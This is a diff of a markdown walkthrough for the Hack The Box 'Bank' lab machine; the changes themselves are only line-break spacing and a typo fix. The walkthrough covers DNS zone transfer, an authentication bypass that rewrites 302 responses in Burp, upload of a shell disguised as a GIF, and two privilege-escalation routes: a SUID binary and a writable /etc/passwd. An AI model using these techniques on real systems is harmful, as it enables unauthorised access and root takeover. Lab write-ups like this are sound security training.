@@ -25,8 +25,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
 ```
-Here we can see that we have port 53 opened running over TCP, which is odd.
-So, now we can try to enumerate this port.
+Here we can see that we have port 53 opened running over TCP, which is odd.  
+So, now we can try to enumerate this port.  
 First we can try ```nslookup```:
 ```
 [root@kali Bank ]$ nslookup    
@@ -44,8 +44,8 @@ Address:        10.10.10.29#53
 Name:   bank.htb
 Address: 10.10.10.29
 ```
-As we can see the there is a record for bank.htb.
-Now we can try to use ```dnsrecon```, dsnrecon is a simple python script that enables to gather DNS-oriented information on
+As we can see the there is a record for bank.htb.  
+Now we can try to use ```dnsrecon```, dsnrecon is a simple python script that enables to gather DNS-oriented information on  
 a given target. Let try to use this tool against this target:
 ```
 [root@kali Bank ]$ dnsrecon -r 127.0.0.1/24 -n 10.10.10.29               
@@ -56,7 +56,7 @@ a given target. Let try to use this tool against this target:
 [*] Performing Reverse Lookup from 10.10.10.0 to 10.10.10.255
 [+] 0 Records Found
 ```
-As we can see there is only one PTR record set for localhost.
+As we can see there is only one PTR record set for localhost.  
 Now, let's try to perform a DNS zone transfer using ```dig```, for the zone bank.htb:
 ```
 [root@kali Bank ]$ dig axfr bank.htb @$TARGET
@@ -102,10 +102,10 @@ Content-Type: text/html
                         </div>
                         [ ... SNIP ... ]
 ```
-So, if we manage to change the response code from 302 to 200, we will be able to render the page.
+So, if we manage to change the response code from 302 to 200, we will be able to render the page.  
 To test this we can use burp and go under ```Proxy > Options > Intercept Server Responses > click on "Intercept Requests based
-on the following rules"``` And now we can request /index.php, edit the the response code from 302 to 200 and now we will be able to render the page.
-Once we have tested that this works, we can create a match and replace rule so that burp will do this work automatically.
+on the following rules"``` And now we can request /index.php, edit the the response code from 302 to 200 and now we will be able to render the page.  
+Once we have tested that this works, we can create a match and replace rule so that burp will do this work automatically.  
 In order to do this, we can navigate to ```Proxy > Options > Match and Replace > click on "Add"``` and create the rule as follow:
 ```
 Type: response header
@@ -113,9 +113,9 @@ Match: 30[12] Found
 Replace: 200 Ok
 Regex match: true
 ```
-Now also with intercept off we can see all the webserver pages without authenticating.
-If we request /support.php, we can see that there is an upload file function.
-This upload function takes only images, so we can try to cheat the checks and upload a payload using the following file.
+Now also with intercept off we can see all the webserver pages without authenticating.  
+If we request /support.php, we can see that there is an upload file function.  
+This upload function takes only images, so we can try to cheat the checks and upload a payload using the following file.  
 ```
 [root@kali Bank ]$ cat shell.gif.php          
 GIF8
@@ -200,9 +200,9 @@ Running gobuster against bank.htb, we can see the following results:
 /server-status        (Status: 403) [Size: 288]
 /balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
 ```
-if we open /balance-transfer directory, we can see some reports with encrypted informations.
-now we can download this files to examine them and see if they contains some valuable information.
-If we run a word count and sort on all the balance transfer files, we can see that one file contains lot less characters.
+if we open /balance-transfer directory, we can see some reports with encrypted information.  
+now we can download this files to examine them and see if they contains some valuable information.  
+If we run a word count and sort on all the balance transfer files, we can see that one file contains lot less characters.  
 ```
 581 941e55bed0cb8052e7015e7133a5b9c7.acc
 581 09ed7588d1cd47ffca297cc7dac22c52.acc
@@ -225,11 +225,11 @@ Transactions: 39
 Balance: 8842803 .
 ===UserAccount===
 ```
-this credentials can be used to access bank.htb.
+this credentials can be used to access bank.htb.  
 Now we can access the support page and, as we know, this page can be used to upload a shell and get code execution.
 ## Root
 ### Method 1 - SUID executable
-Once we have the initial shell, we can run linpeas and see if there is any priversc vector.
+Once we have the initial shell, we can run linpeas and see if there is any priversc vector.  
 As we can see there is an executable with SUID bit set:
 ```
 -rwsr-xr-x 1 root root 110K Jun 14  2017 /var/htb/bin/emergency (Unknown SUID binary)
@@ -244,13 +244,13 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
 ```
 
 ### Method 2 - World writable /etc/passwd
-Once we have the initial shell, we can run linpeas and see if there is any priversc vector.
-As we can see linpeas notice us that /etc/passwd file is writable by anyone.
+Once we have the initial shell, we can run linpeas and see if there is any priversc vector.  
+As we can see linpeas notice us that /etc/passwd file is writable by anyone.  
 ```
  ╔══════════╣ Permissions in init, init.d, systemd, and                                    
 ═╣ Writable passwd file? ................ /etc/passwd is writable
 ```
-so now we can create a new password, edit the file and login with the created password.
+so now we can create a new password, edit the file and login with the created password.  
 To create the password we can use openssl:
 ```
 www-data@bank:/var/www/bank/uploads$ openssl passwd lucab0dd
